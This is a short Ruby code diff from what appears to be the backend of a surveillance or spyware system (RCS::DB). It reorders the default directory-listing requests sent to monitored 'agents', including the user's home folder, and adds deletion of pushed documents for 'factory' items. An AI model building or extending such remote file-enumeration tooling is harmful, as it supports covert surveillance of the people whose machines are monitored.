@@ -351,11 +351,11 @@ class Item
     # the request for the root
     self.filesystem_requests.create!({path: '/', depth: 1})
 
-    # the home for the current user
-    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
-
     # special request for windows to have the c: drive
     self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'
+
+    # the home for the current user
+    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
   end
 
   def create_callback
@@ -415,6 +415,9 @@ class Item
           Evidence.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
           trace :info, "Deleting evidence for agent #{self.name} done."
         end
+      when 'factory'
+        # delete all the pushed documents of this factory
+        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
     end
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'destroy'})
@@ -451,6 +454,9 @@ class Item
           agent.status = 'closed'
           agent.save
         end
+      when 'factory'
+        # delete all the pushed documents of this factory
+        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
     end
   end
 
